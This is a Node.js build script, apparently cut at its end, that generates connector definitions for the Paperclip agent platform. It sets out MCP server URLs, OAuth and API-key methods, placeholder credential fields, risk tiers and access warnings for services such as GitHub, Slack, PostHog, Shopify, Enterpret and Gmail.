import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs";
import path from "node:path";
const root = process.cwd();
// Provider definitions can be regenerated without the external research corpus.
// This mode preserves the checked-in ingestion report.
const definitionsOnly = process.argv.includes("--definitions-only");
const corpus =
  process.env.PAPERCLIP_CONTENT_TEMPLATES ??
  path.resolve(
    root,
    "../../paperclip-content/research/connections/vercel/templates",
  );
const out = path.join(root, "packages/shared/src/app-definitions");
const brandingManifest = JSON.parse(
  fs.readFileSync(
    path.join(root, "ui/public/brands/apps/manifest.json"),
    "utf8",
  ),
);
const brandingBySlug = new Map(
  brandingManifest.providers.map((entry) => [entry.slug, entry]),
);
const brandingFor = (slug) => {
  const entry = brandingBySlug.get(slug);
  if (entry)
    return {
      logoUrl: entry.localAsset,
      ...(entry.darkAsset ? { darkLogoUrl: entry.darkAsset } : {}),
    };
  if (slug === "oauth-generic" || slug === "api-key-generic")
    return { logoUrl: `/brands/apps/${slug}.svg` };
  throw new Error(`${slug}: missing local branding provenance`);
};
const field = (key, label, placeholder) => ({
  key,
  label,
  type: "password",
  required: true,
  placeholder,
  secret: true,
});
const method = (
  key,
  transport,
  auth,
  defaults,
  riskTier,
  guidanceMd,
  extra = {},
) => ({
  key,
  transport,
  auth,
  ownershipModes: auth === "oauth" ? ["customer", "dcr"] : ["customer"],
  whenToUse:
    transport === "mcp_remote"
      ? "Use the provider-hosted connection for the quickest setup."
      : "Use credentials from your provider account.",
  defaults,
  guidanceMd,
  riskTier,
  ...extra,
});
const chatProviderName = (provider) =>
  ({
    discord: "Discord",
    github: "GitHub",
    "microsoft-teams": "Microsoft Teams",
    slack: "Slack",
    telegram: "Telegram",
    "imessage-photon": "iMessage Photon",
  })[provider];
const channelMethod = (
  provider,
  credentialFields,
  requiredResourceFilters,
  guidanceMd,
  consoleLinks,
) => ({
  key: "chat-agent",
  label: "Chat with an agent",
  purpose: "channel",
  provider,
  transport: "chat_sdk",
  auth: "api_key",
  ownershipModes: ["customer"],
  whenToUse: `Let people in ${chatProviderName(provider)} start and continue work with one Paperclip agent.`,
  credentialFields,
  guidanceMd,
  consoleLinks,
  riskTier: "S3",
  requiredResourceFilters,
});
const vercelConnect = (
  serviceOrServices,
  principalMode,
  scopes,
  header = { name: "Authorization", prefix: "Bearer " },
) => ({
  credentialSources: {
    vercelConnect: {
      services: Array.isArray(serviceOrServices)
        ? serviceOrServices
        : [serviceOrServices],
      principalModes: [principalMode],
      scopes,
      header,
    },
  },
});
const posthogConfigFields = () => [
  {
    key: "projectId",
    label: "Pin to project ID",
    type: "text",
    advanced: true,
    placeholder: "Optional numeric project ID",
    helperMd:
      "Optional. Pin this connection to one project and remove PostHog's project-switching tool.",
    validation: { pattern: "^[0-9]+$", maxLength: 32 },
    transport: { location: "header", name: "x-posthog-project-id" },
  },
  {
    key: "readOnly",
    label: "Read-only mode",
    type: "checkbox",
    advanced: true,
    defaultValue: false,
    helperMd: "Turn on to hide tools that can change PostHog data.",
    transport: {
      location: "query",
      name: "readonly",
      format: "boolean",
      omitFalse: true,
    },
  },
  {
    key: "features",
    label: "Feature groups",
    type: "textarea",
    advanced: true,
    placeholder: "Optional comma-separated feature groups",
    helperMd:
      "Leave blank to expose every feature group, or enter a comma-separated list to narrow access.",
    validation: { maxLength: 500 },
    transport: { location: "query", name: "features", format: "csv" },
  },
  {
    key: "tools",
    label: "Individual tools",
    type: "textarea",
    advanced: true,
    placeholder: "Optional comma-separated tool names",
    helperMd:
      "Leave blank to expose all tools. Exact names here are combined with any feature groups.",
    validation: { maxLength: 2000 },
    transport: { location: "query", name: "tools", format: "csv" },
  },
  {
    key: "mode",
    label: "Tool response mode",
    type: "select",
    hidden: true,
    required: true,
    placeholder: "Individual tools",
    defaultValue: "tools",
    options: [{ value: "tools", label: "Individual tools" }],
    helperMd:
      "Paperclip uses individual tools so every action can be governed. CLI mode remains unavailable until nested execution is governed.",
    transport: { location: "query", name: "mode" },
  },
];
const posthogMethod = (key, auth, extra = {}) =>
  method(
    key,
    "mcp_remote",
    auth,
    { serverUrl: "https://mcp.posthog.com/mcp" },
    "S3",
    "Connect with PostHog's recommended defaults. Project pinning, read-only access, and catalog filters are optional advanced controls.",
    { tenantFields: posthogConfigFields(), ...extra },
  );
const apps = [
  ["agentmail", "AgentMail", "Give agents email inboxes and handle each conversation as a task.", "communication", "agentmail.to", ["https://console.agentmail.to/*"], {
    key: "email-agent", label: "Email with an agent", purpose: "channel", provider: "agentmail", transport: "rest_api", auth: "api_key", ownershipModes: ["customer"],
    whenToUse: "Assign an inbox to an agent and manage email conversations in tasks.", credentialFields: [{ key: "apiKey", label: "AgentMail API key", type: "password", placeholder: "am_…", required: true, secret: true }],
    guidanceMd: "Connect an AgentMail API key, then create or select an inbox for your agent. WebSocket receiving works without a public URL.",
    consoleLinks: { keys: "https://console.agentmail.to/dashboard/api-keys", docs: "https://docs.agentmail.to/inboxes" }, riskTier: "S3", requiredResourceFilters: ["inbox"]
  }],
  [
    "zapier",
    "Zapier",
    "Reach thousands of apps through your Zapier account.",
    "productivity",
    "zapier.com",
    ["https://mcp.zapier.com/*"],
    method(
      "generated-url",
      "mcp_remote",
      "none",
      {},
      "S3",
      "Create a Zapier MCP server, then paste the complete generated connection URL. The token remains embedded in that URL.",
      {
        label: "Paste generated MCP URL",
        whenToUse: "Use the complete provider-generated MCP URL from Zapier.",
      },
    ),
  ],
  ...[
    ["arcade", "Arcade", "https://api.arcade.dev/*", "https://docs.arcade.dev/en/operate/governance/mcp-gateways"],
    ["executor", "Executor", "https://executor.sh/*", "https://executor.sh/docs/mcp-proxy"],
  ].map(([slug, name, pattern, docsUrl]) => [
    slug, name, `Use the tools exposed by your ${name} MCP connection.`, "productivity", new URL(pattern).hostname, [pattern],
    method("mcp", "mcp_remote", "none", {}, "S3", `Paste your ${name} MCP URL. Sign in if required, or add a token or headers under Advanced authentication.`, {
      label: "Connect MCP server", ownershipModes: ["dcr", "customer"], consoleLinks: { docs: docsUrl },
    }),
    { featured: true, docsUrl },
  ]),
  [
    "railway",
    "Railway",
    "Inspect services and logs, deploy applications, and run commands in your Railway containers.",
    "developer",
    "railway.com",
    ["https://mcp.railway.com/"],
    method(
      "mcp-oauth",
      "mcp_remote",
      "oauth",
      {
        serverUrl: "https://mcp.railway.com",
        scopesHint: ["openid", "offline_access", "workspace:member"],
        oauthAuthorizationParams: { prompt: "consent" },
      },
      "S4",
      "Sign in to Railway and select the workspaces your agents may use. Paperclip adds direct service, deployment, and bounded log tools when Railway accepts the connection for API access. Container commands require the separate SSH setup on the connection. Project tokens are not supported by Railway's hosted connection.",
      {
        label: "Connect Railway",
        ownershipModes: ["dcr", "customer"],
        whenToUse: "Authorize your Railway account in the browser.",
        consoleLinks: {
          docs: "https://docs.railway.com/ai/mcp-server",
          register: "https://docs.railway.com/integrations/oauth/creating-an-app",
          settings: "https://railway.com/account",
        },
        warnings: [
          "Railway enforces the workspaces selected at consent. Selected actions start Allowed; choose Ask first for operations you want to approve.",
          "Logs and container commands can expose application data and secrets. Grant access only to agents trusted with the selected services.",
          "The general Railway agent and committing staged changes are unavailable because their internal changes cannot be individually reviewed in Paperclip.",
          "Live Railway qualification is pending. If Railway rejects API access, reconnect with the required permissions; Paperclip never falls back to another credential.",
        ],
        requiredResourceFilters: ["workspace", "project", "environment", "service"],
      },
    ),
    { redirectConstraints: "https-or-loopback-http" },
  ],
  [
    "github",
    "GitHub",
    "Give agents access to GitHub repositories, issues, and pull requests.",
    "developer",
    "github.com",
    ["https://api.githubcopilot.com/mcp/*", "https://github.com/*"],
    [
      method(
        "managed",
        "mcp_remote",
        "oauth",
        { serverUrl: "https://api.githubcopilot.com/mcp/" },
        "S3",
        "Authorize Paperclip, then choose selected repositories in GitHub. You can edit repository access later from GitHub's installation settings.",
        {
          label: "Connect GitHub",
          purpose: "tool",
          oauthStrategy: "paperclip_cloud_connector",
          connectorProfile: "github.code",
          grantKinds: ["user", "agent"],
          ownershipModes: ["platform_shared"],
          whenToUse:
            "Connect your GitHub account for durable MCP, shell Git, gh, and repository access.",
          warnings: [
            "Shell Git and gh receive this identity for the run and are not constrained by per-tool Ask-first controls.",
          ],
          requiredResourceFilters: ["organization", "repository"],
        },
      ),
      method(
        "mcp-key",
        "mcp_remote",
        "api_key",
        { serverUrl: "https://api.githubcopilot.com/mcp/" },
        "S3",
        "Create a fine-grained token limited to the repositories agents should use.",
        {
          label: "Personal access token (advanced)",
          purpose: "tool",
          credentialFields: [
            field("authorization", "GitHub token", "github_pat_..."),
          ],
          keyPlacement: {
            location: "header",
            name: "Authorization",
            prefix: "Bearer ",
          },
          requiredResourceFilters: ["organization", "repository"],
        },
      ),
    ],
  ],
  [
    "github-code-review-bot",
    "GitHub Code Review Bot",
    "Have an agent review pull requests and respond to GitHub mentions.",
    "developer",
    "github.com",
    [],
    channelMethod(
      "github",
      [
        {
          ...field("appId", "GitHub App ID", "123456"),
          type: "text",
          secret: false,
        },
        {
          ...field(
            "privateKey",
            "Private key (PEM)",
            "-----BEGIN RSA PRIVATE KEY-----",
          ),
          type: "textarea",
        },
      ],
      ["organization", "repository"],
      "Generate the webhook secret in Paperclip, then create one private GitHub App with active SSL-verified webhooks, Issues and Pull requests read/write permission, and the selectable issue_comment and pull_request_review_comment events. GitHub sends installation and installation_repositories automatically. Install the App only on repositories where people may mention the agent.",
      {
        register: "https://github.com/settings/apps/new",
        docs: "https://docs.github.com/en/apps/creating-github-apps/registering-a-github-app/registering-a-github-app",
      },
    ),
    { featured: true },
  ],
  [
    "slack",
    "Slack",
    "Give agents Slack tools or let people start and continue Paperclip work from Slack.",
    "communication",
    "slack.com",
    ["https://mcp.slack.com/*", "https://app.slack.com/client/*"],
    [
      method(
        "mcp-oauth",
        "mcp_remote",
        "oauth",
        {
          serverUrl: "https://mcp.slack.com/mcp",
          authorizationEndpoint: "https://slack.com/oauth/v2/authorize",
          tokenEndpoint: "https://slack.com/api/oauth.v2.access",
          scopesHint: ["channels:read", "chat:write", "search:read"],
        },
        "S3",
        "Connect a Slack workspace and limit access to the channels agents need.",
        {
          label: "Use this connection as an agent tool",
          purpose: "tool",
          ownershipModes: ["customer"],
          requiredResourceFilters: ["workspace", "channel"],
        },
      ),
      channelMethod(
        "slack",
        [
          field("botToken", "Bot User OAuth Token", "xoxb-..."),
          field(
            "signingSecret",
            "Signing Secret",
            "Paste the Slack App signing secret",
          ),
        ],
        ["workspace", "channel"],
        "Create and install one Slack App for this agent. Paperclip receives verified Events API requests and interactive callbacks, acknowledges with reactions, responds in direct messages, and starts one Paperclip task per new mentioned channel thread.",
        {
          register: "https://api.slack.com/apps",
          docs: "https://api.slack.com/start/quickstart",
        },
      ),
    ],
  ],
  [
    "microsoft-teams",
    "Microsoft Teams",
    "Let people start and continue Paperclip work with an agent from Microsoft Teams.",
    "communication",
    "teams.microsoft.com",
    ["https://teams.microsoft.com/*"],
    channelMethod(
      "microsoft-teams",
      [
        {
          ...field(
            "clientId",
            "Application / Client ID",
            "00000000-0000-0000-0000-000000000000",
          ),
          type: "text",
          secret: false,
        },
        {
          ...field(
            "tenantId",
            "Directory / Tenant ID",
            "00000000-0000-0000-0000-000000000000",
          ),
          type: "text",
          secret: false,
        },
        field("clientSecret", "Client secret", "Paste the client-secret value"),
      ],
      ["team", "channel", "chat"],
      "Use a Microsoft 365 work or school organization where you can register an Entra app, create a single-tenant Azure Bot, and upload or install a Teams app. Personal or free Teams accounts at teams.live.com cannot complete this setup. Enable personal, team, and groupChat bot scopes and the ChannelMessage.Read.Group and ChatMessage.Read.Chat resource-specific application permissions. Those RSC grants let an installed app receive every message in a team or group chat without an @mention, so explain that access to installers. One team install covers its standard channels; private and shared channels require a separate installation and are not supported by this release.",
      {
        register: "https://dev.teams.microsoft.com/apps",
        docs: "https://learn.microsoft.com/en-us/microsoftteams/platform/bots/how-to/create-a-bot-for-teams",
      },
    ),
  ],
  [
    "imessage-photon", "iMessage Photon",
    "Message a Paperclip agent from Apple Messages using Photon Cloud. Pro supports DMs; dedicated lines also support groups.",
    "communication", "photon.codes", ["https://photon.codes/*"],
    channelMethod("imessage-photon", [field("projectSecret", "Project secret", "Photon project secret")], ["direct_message", "group_chat"],
      "Connect a Photon Cloud project. Pro shared lines support DMs after sender enrollment in Photon and identity linking in Paperclip. Dedicated lines also support individually enabled groups.",
      { register: "https://photon.codes/", docs: "https://photon.codes/docs/spectrum-ts/providers/imessage/connection-and-routing" }),
  ],
  [
    "telegram",
    "Telegram",
    "Let people start and continue Paperclip work with an agent from Telegram.",
    "communication",
    "telegram.org",
    ["https://t.me/*", "https://telegram.me/*", "https://api.telegram.org/*"],
    channelMethod(
      "telegram",
      [field("botToken", "Bot token", "123456789:AA...")],
      ["chat", "group", "topic"],
      "Create one dedicated bot with BotFather, then connect its token to the public Paperclip webhook endpoint.",
      {
        register: "https://t.me/BotFather",
        docs: "https://core.telegram.org/bots/tutorial",
      },
    ),
  ],
  [
    "discord",
    "Discord",
    "Let people start and continue Paperclip work with an agent from Discord.",
    "communication",
    "discord.com",
    ["https://discord.com/*"],
    channelMethod(
      "discord",
      [
        field("botToken", "Bot token", "Paste the Discord bot token"),
        {
          ...field("applicationId", "Application ID", "123456789012345678"),
          type: "text",
          secret: false,
        },
        {
          ...field("guildId", "Server ID", "123456789012345678"),
          type: "text",
          secret: false,
        },
      ],
      ["channel"],
      "Create one dedicated Discord application and bot, enable the Message Content intent, install it in one server with the documented bot permissions, then connect its bot token, Application ID, and server ID. Paperclip starts one Discord thread per root bot mention and keeps the linked Paperclip task authoritative.",
      {
        register: "https://discord.com/developers/applications",
        docs: "https://discord.com/developers/docs/quick-start/getting-started",
      },
    ),
  ],
  [
    "notion",
    "Notion",
    "Read and update pages in your Notion workspace.",
    "content",
    "notion.so",
    ["https://mcp.notion.com/*"],
    method(
      "mcp-oauth",
      "mcp_remote",
      "oauth",
      { serverUrl: "https://mcp.notion.com/mcp" },
      "S3",
      "Connect Notion for workspace content. Share only the pages and databases agents should use.",
      {
        requiredResourceFilters: ["workspace", "page", "database"],
        ...vercelConnect("notion", "user", ["*"]),
      },
    ),
    { redirectConstraints: "https-or-loopback-http" },
  ],
  [
    "posthog",
    "PostHog",
    "Analyze product usage, errors, feature flags, and experiments with PostHog's hosted MCP server.",
    "analytics",
    "posthog.com",
    ["https://mcp.posthog.com/*"],
    [
      posthogMethod("mcp-oauth", "oauth", {
        label: "Sign in with PostHog",
        ownershipModes: ["customer", "dcr"],
        whenToUse:
          "Sign in with PostHog in the browser. Recommended for hosted PostHog accounts.",
        consoleLinks: {
          docs: "https://posthog.com/docs/model-context-protocol",
        },
        ...vercelConnect(["posthog", "mcp.posthog.com/mcp"], "user", ["*"]),
      }),
      posthogMethod("mcp-api-key", "api_key", {
        label: "Use a personal API key",
        whenToUse:
          "Use a PostHog personal API key when browser sign-in is not suitable.",
        credentialFields: [
          field("authorization", "PostHog personal API key", "phx_..."),
        ],
        keyPlacement: {
          location: "header",
          name: "Authorization",
          prefix: "Bearer ",
        },
        consoleLinks: {
          keys: "https://posthog.com/docs/model-context-protocol/faq",
          docs: "https://posthog.com/docs/model-context-protocol/faq",
        },
        ...vercelConnect(["posthog", "mcp.posthog.com/mcp"], "app", ["*"]),
      }),
    ],
    { featured: true },
  ],
  [
    "linear",
    "Linear",
    "Create, update, and read Linear issues.",
    "productivity",
    "linear.app",
    ["https://mcp.linear.app/*"],
    method(
      "mcp-oauth",
      "mcp_remote",
      "oauth",
      {
        serverUrl: "https://mcp.linear.app/mcp",
        authorizationEndpoint: "https://linear.app/oauth/authorize",
        tokenEndpoint: "https://api.linear.app/oauth/token",
        scopesHint: ["read", "write"],
      },
      "S2",
      "Register a Linear OAuth app and add Paperclip's redirect URI before connecting.",
      {
        ownershipModes: ["customer"],
        requiredResourceFilters: ["workspace", "team", "project"],
        ...vercelConnect("linear", "user", ["read", "write"]),
      },
    ),
  ],
  [
    "google-sheets",
    "Google Sheets",
    "Read and update selected spreadsheets.",
    "data",
    "sheets.google.com",
    ["https://docs.google.com/spreadsheets/*", "https://sheets.google.com/*"],
    method(
      "local",
      "local_stdio",
      "none",
      { templateKey: "paperclip.google-sheets" },
      "S3",
      "Share each spreadsheet with the Paperclip robot email, then paste the sheet links.",
      { requiredResourceFilters: ["spreadsheet"] },
    ),
  ],
  [
    "context7",
    "Context7",
    "Look up current documentation for software libraries.",
    "developer",
    "context7.com",
    ["https://mcp.context7.com/*"],
    method(
      "mcp",
      "mcp_remote",
      "none",
      { serverUrl: "https://mcp.context7.com/mcp" },
      "S1",
      "Connect Context7 to give agents current library documentation.",
    ),
  ],
  [
    "shopify",
    "Shopify",
    "Search a store's products and policies, and manage shopping carts.",
    "commerce",
    "shopify.com",
    ["https://*.myshopify.com/api/ucp/mcp", "https://*.myshopify.com/api/mcp"],
    [
      method(
        "ucp-commerce",
        "mcp_remote",
        "none",
        {
          serverUrlTemplate: "https://{storeDomain}/api/ucp/mcp",
          toolArgumentDefaults: {
            meta: {
              "ucp-agent": {
                profile:
                  "https://shopify.dev/ucp/agent-profiles/examples/2026-04-08/valid-with-capabilities.json",
              },
            },
          },
        },
        "S3",
        "Connect Shopify's current UCP server for shopper-facing catalog and commerce tools. Paperclip supplies the required agent profile automatically.",
        {
          label: "Shopify UCP commerce",
          whenToUse:
            "Recommended for Shopify's current UCP catalog, cart, and checkout tools.",
          tenantFields: [
            {
              key: "storeDomain",
              label: "Store domain",
              type: "text",
              required: true,
              placeholder: "your-store.myshopify.com",
              helperMd:
                "Enter the permanent myshopify.com domain without https://. Custom storefront domains are not the MCP endpoint.",
              validation: {
                pattern: "^[A-Za-z0-9][A-Za-z0-9-]*\\.myshopify\\.com$",
                maxLength: 255,
              },
            },
          ],
          consoleLinks: {
            docs: "https://shopify.dev/docs/agents/catalog/storefront-catalog",
          },
          warnings: [
            "This is Shopify's shopper-facing UCP server, not Admin API access. It does not manage merchant products or customers.",
            "The storefront must be public. A private or password-protected storefront returns HTTP 401 even when the merchant is signed in to Shopify Admin.",
            "Paperclip currently uses Shopify's documented hosted agent-profile fixture while Paperclip's production UCP profile is being established.",
          ],
          requiredResourceFilters: ["store"],
        },
      ),
      method(
        "storefront-mcp",
        "mcp_remote",
        "none",
        { serverUrlTemplate: "https://{storeDomain}/api/mcp" },
        "S3",
        "Connect Shopify's official Storefront MCP server for shopper-facing catalog, policy, and cart tools.",
        {
          label: "Storefront policies and compatibility tools",
          whenToUse:
            "Use Shopify's compatibility server when agents need storefront policy and FAQ search.",
          tenantFields: [
            {
              key: "storeDomain",
              label: "Store domain",
              type: "text",
              required: true,
              placeholder: "your-store.myshopify.com",
              helperMd:
                "Enter the permanent myshopify.com domain without https://. Custom storefront domains are not the MCP endpoint.",
              validation: {
                pattern: "^[A-Za-z0-9][A-Za-z0-9-]*\\.myshopify\\.com$",
                maxLength: 255,
              },
            },
          ],
          consoleLinks: {
            docs: "https://shopify.dev/docs/apps/build/storefront-mcp/servers/storefront",
          },
          warnings: [
            "This is Shopify's Storefront MCP, not Admin API access. It does not manage merchant products, orders, or customers.",
            "The storefront must be public. A private or password-protected storefront returns HTTP 401 even when the merchant is signed in to Shopify Admin.",
          ],
          requiredResourceFilters: ["store"],
        },
      ),
    ],
    {
      docsUrl:
        "https://shopify.dev/docs/apps/build/storefront-mcp/servers/storefront",
      setupPrerequisite: {
        title: "Launch the storefront before connecting",
        description:
          "Shopify's Storefront MCP is a public, no-auth endpoint. Paperclip cannot use the merchant's Shopify Admin session to bypass a private storefront.",
        steps: [
          "Select a Shopify plan; Shopify keeps trial storefronts private until a plan is selected.",
          "In Shopify Admin, open Online Store → Preferences and set Storefront visibility to Public (remove password protection).",
          "Use the permanent <store>.myshopify.com domain in Paperclip, even if the store also has a custom domain.",
        ],
        actionLabel: "Open Shopify Admin",
        actionUrl: "https://admin.shopify.com/",
      },
    },
  ],
  [
    "composio",
    "Composio",
    "Discover and use connected apps through Composio Connect.",
    "productivity",
    "composio.dev",
    ["https://backend.composio.dev/*", "https://connect.composio.dev/*", "https://mcp.composio.dev/*", "https://*.composio.dev/*"],
    [method("mcp", "mcp_remote", "none", { serverUrl: "https://connect.composio.dev/mcp" }, "S3", "Sign in to Composio Connect, or paste an externally configured MCP session URL and headers.", { label: "Composio Connect", ownershipModes: ["dcr", "customer"] })],
    { featured: true, docsUrl: "https://docs.composio.dev/docs/composio-connect" },
  ],
  [
    "oauth-generic",
    "OAuth app",
    "Connect a provider using your own OAuth client.",
    "other",
    "oauth.net",
    [],
    method(
      "oauth",
      "rest_api",
      "oauth",
      {},
      "S3",
      "Register an OAuth client with the provider and add Paperclip's redirect URI.",
      {
        credentialFields: [
          {
            ...field("clientId", "Client ID", "Paste the client ID"),
            type: "text",
            secret: false,
          },
          field("clientSecret", "Client secret", "Paste the client secret"),
        ],
      },
    ),
  ],
  [
    "api-key-generic",
    "API key app",
    "Connect an API using a key from your provider.",
    "other",
    "openapis.org",
    [],
    method(
      "api-key",
      "rest_api",
      "api_key",
      {},
      "S3",
      "Create a restricted API key and paste it here.",
      {
        credentialFields: [field("apiKey", "API key", "Paste the API key")],
        keyPlacement: {
          location: "header",
          name: "Authorization",
          prefix: "Bearer ",
        },
      },
    ),
  ],
  [
    "sentry",
    "Sentry",
    "Investigate errors, releases, and production issues.",
    "developer",
    "sentry.io",
    ["https://mcp.sentry.dev/*"],
    method(
      "mcp-oauth",
      "mcp_remote",
      "oauth",
      {
        serverUrl: "https://mcp.sentry.dev/mcp",
        discoveryUrl:
          "https://mcp.sentry.dev/.well-known/oauth-protected-resource/mcp",
      },
      "S2",
      "Connect the Sentry organization and projects agents need for incident work.",
      { requiredResourceFilters: ["organization", "project", "environment"] },
    ),
  ],
  [
    "vercel",
    "Vercel",
    "Inspect projects, deployments, and runtime logs.",
    "developer",
    "vercel.com",
    ["https://mcp.vercel.com/*"],
    method(
      "mcp-oauth",
      "mcp_remote",
      "oauth",
      { serverUrl: "https://mcp.vercel.com/mcp" },
      "S3",
      "Connect the Vercel team and projects agents should operate.",
      { requiredResourceFilters: ["team", "project", "environment"] },
    ),
  ],
  // Enterpret advertises RFC 9728 -> RFC 8414 discovery from its own 401
  // challenge (issuer https://oauth.enterpret.com, PKCE S256, registration
  // endpoint present, token_endpoint_auth_method "none"), so `defaults` ships
  // `serverUrl` only and the broker resolves endpoints at connect time.
  // Both methods target the official read-only Enterpret MCP. Enterpret Agent's
  // beta write MCP is a separate service and is outside this connector's scope.
  // OAuth scope reporting and revocation-cache fixes await provider deployment
  // and fresh live validation; scope names alone do not prove write capability.
  // The provider documents no customer-registered OAuth app, so OAuth stays
  // `dcr` only rather than `["customer", "dcr"]`.
  [
    "enterpret",
    "Enterpret",
    "Ask questions about your customer feedback and pull verbatim quotes with citations.",
    "analytics",
    "enterpret.com",
    ["https://wisdom-api.enterpret.com/*"],
    [
      method(
        "mcp-api-key",
        "mcp_remote",
        "api_key",
        { serverUrl: "https://wisdom-api.enterpret.com/server/mcp" },
        "S3",
        "Generate an auth token in Enterpret under Settings, Enterpret MCP, then paste it below. One token belongs to one Enterpret organization. This is the recommended connection method.",
        {
          label: "Use an auth token",
          grantKinds: ["organization"],
          whenToUse:
            "Recommended. Use an organization auth token from Settings → Enterpret MCP. This is the primary, store-ready connection method.",
          credentialFields: [
            field(
              "authorization",
              "Enterpret auth token",
              "Paste the token from Settings, Enterpret MCP",
            ),
          ],
          keyPlacement: {
            location: "header",
            name: "Authorization",
            prefix: "Bearer ",
          },
          consoleLinks: {
            docs: "https://enterpret.support.site/article/enterpret-mcp-server",
          },
          warnings: [
            "Check your auth token's expiry in Enterpret Settings > Enterpret MCP and replace it before it lapses.",
            "This connection reads customer feedback, including verbatim quotes with speaker attribution.",
            "run_graph_query starts as Ask first. Cypher is not established as read-only even when Enterpret advertises readOnlyHint.",
          ],
        },
      ),
      method(
        "mcp-oauth",
        "mcp_remote",
        "oauth",
        {
          serverUrl: "https://wisdom-api.enterpret.com/server/mcp",
          scopesHint: ["mcp:read"],
        },
        "S3",
        "Sign in to Enterpret in the browser to query the official read-only MCP. Each person connects with their own Enterpret account, and Enterpret attributes their queries individually.",
        {
          label: "Sign in with Enterpret",
          ownershipModes: ["dcr"],
          grantKinds: ["user"],
          whenToUse:
            "Use browser sign-in when each person should query feedback under their own Enterpret account.",
          consoleLinks: {
            docs: "https://enterpret.support.site/article/enterpret-mcp-server",
          },
          warnings: [
            "The official Enterpret MCP is read-only. Enterpret previously reported broader OAuth scopes, including mcp:write and email, than Paperclip requested. Enterpret is correcting this scope reporting; it does not establish access to the separate beta Agent MCP.",
            "After revocation, Enterpret may cache token validity for up to 24 hours. Disconnect this connection to stop Paperclip access immediately. Enterpret is reducing this delay.",
            "You need an Enterpret account with access to your organization's feedback.",
            "This connection reads customer feedback, including verbatim quotes with speaker attribution.",
          ],
        },
      ),
    ],
    {
      docsUrl: "https://enterpret.support.site/article/enterpret-mcp-server",
      redirectConstraints: "https-or-loopback-http",
    },
  ],
  [
    "anthropic",
    "Anthropic",
    "Use Anthropic APIs with a restricted key.",
    "ai",
    "anthropic.com",
    ["https://api.anthropic.com/*"],
    method(
      "api-key",
      "rest_api",
      "api_key",
      { serviceHost: "api.anthropic.com" },
      "S3",
      "Create a key in the Anthropic Console and rotate it if it has been exposed.",
      {
        credentialFields: [field("apiKey", "API key", "sk-ant-api03-...")],
        keyPlacement: { location: "header", name: "x-api-key" },
      },
    ),
  ],
  ["browser-use-cloud", "Browser Use Cloud", "Delegate browser tasks and watch them live in Paperclip.", "productivity", "browser-use.com", ["https://cloud.browser-use.com/*"],
    method("cloud-v4", "rest_api", "api_key", { serverUrl: "https://api.browser-use.com/api/v4" }, "S3",
      "Create an API key in [Browser Use settings](https://cloud.browser-use.com/settings) and paste it below. Your agents can browse websites while you watch and interact from the task's Browser tab.", {
        label: "Browser Use Cloud",
        credentialFields: [{ ...field("apiKey", "API key", "bu_…"), helperMd: "Open Browser Use → Settings → API keys. Create a key for the project agents should use." }],
        keyPlacement: { location: "header", name: "X-Browser-Use-API-Key" },
        consoleLinks: { keys: "https://cloud.browser-use.com/settings", docs: "https://docs.browser-use.com/cloud/api-v4-overview" },
      }),
    { docsUrl: "https://docs.browser-use.com/cloud/api-v4-overview" },
  ],
].map(
  ([
    slug,
    name,
    description,
    category,
    _domain,
    urlPatterns,
    m,
    extra = {},
  ]) => ({
    schemaVersion: 1,
    slug,
    name,
    description,
    categories: [category],
    featured: [
      "zapier",
      "github",
      "slack",
      "notion",
      "posthog",
      "linear",
    ].includes(slug),
    branding: brandingFor(slug),
    urlPatterns,
    methods: Array.isArray(m) ? m : [m],
    ...extra,
  }),
);
apps.push({
  schemaVersion: 1,
  slug: "gmail",
  name: "Gmail",
  description:
    "Search and read Gmail messages and create drafts without enabling mail sending.",
  categories: ["communication", "productivity"],
  featured: true,
  branding: brandingFor("gmail"),
  urlPatterns: ["https://gmailmcp.googleapis.com/*"],
  docsUrl:
    "https://developers.google.com/workspace/guides/configure-mcp-servers",
  redirectConstraints: "https-or-loopback-http",
  methods: [
    {
      key: "paperclip-id-oauth",
      label: "Connect Gmail",
      transport: "mcp_remote",
      auth: "oauth",
      oauthStrategy: "paperclip_id_connector",
      grantKinds: ["user"],
      ownershipModes: ["customer"],
      whenToUse:
        "Use Paperclip ID for a personal Gmail connection with centrally registered Google OAuth.",
      defaults: {
        serverUrl: "https://gmailmcp.googleapis.com/mcp/v1",
        scopesHint: [
          "https://www.googleapis.com/auth/gmail.readonly",
          "https://www.googleapis.com/auth/gmail.compose",
        ],
      },
      guidanceMd:
        "Connect your Gmail identity. Paperclip can search and read mail and create drafts. Sending mail is not enabled.",
      warnings: [
        "This connection is personal. Agents need an explicit install, profile, and delegation before they can use it.",
      ],
      riskTier: "S3",
    },
  ],
});

// The reviewed MCP program is a durable input, not another hand-maintained
// allowlist. Runtime definitions are generated from the same 46-row evidence
// ledger that the tests and implementation checklist validate.
const researchManifest = JSON.parse(
  fs.readFileSync(
    path.join(root, "packages/shared/src/self-serve-mcp-research.json"),
    "utf8",
  ),
);
const categoryBySlug = {
  airtable: "data",
  asana: "productivity",
  beehiiv: "content",
  bitly: "analytics",
  box: "content",
  brex: "commerce",
  candid: "data",
  clickhouse: "data",
  cloudflare: "developer",
  cloudinary: "content",
  coda: "productivity",
  ditto: "content",
  egnyte: "content",
  embat: "commerce",
  fireflies: "productivity",
  gauge: "analytics",
  "hugging-face": "ai",
  jira: "productivity",
  kernel: "developer",
  "local-falcon": "analytics",
  make: "productivity",
  manufact: "productivity",
  mem0: "ai",
  zep: "ai",
  supermemory: "ai",
  honcho: "ai",
  miro: "productivity",
  mixpanel: "analytics",
  netlify: "developer",
  neon: "data",
  notion: "content",
  oreilly: "content",
  pagerduty: "developer",
  planetscale: "data",
  posthog: "analytics",
  postman: "developer",
  razorpay: "commerce",
  resend: "communication",
  sanity: "content",
  sentry: "developer",
  similarweb: "analytics",
  stripe: "commerce",
  superagent: "developer",
  supabase: "data",
  telem: "ai",
  "ticket-tailor": "commerce",
  ticktick: "productivity",
  todoist: "productivity",
  webflow: "content",
  wix: "content",
  xero: "commerce",
  youcom: "ai",
  zapier: "productivity",
};
const oauthMethodFor = (
  entry,
  key = "mcp-oauth",
  serverUrl = entry.serverUrl,
  extra = {},
) =>
  method(
    key,
    "mcp_remote",
    "oauth",
    { serverUrl },
    entry.riskTier,
    `Connect ${entry.name} in the browser. ${entry.prerequisite}`,
    {
      label: `Sign in with ${entry.name}`,
      ownershipModes: ["dcr"],
      whenToUse: "Use browser sign-in for the provider-hosted MCP server.",
      consoleLinks: { docs: entry.docsUrl },
      warnings: [entry.prerequisite],
      ...extra,
    },
  );
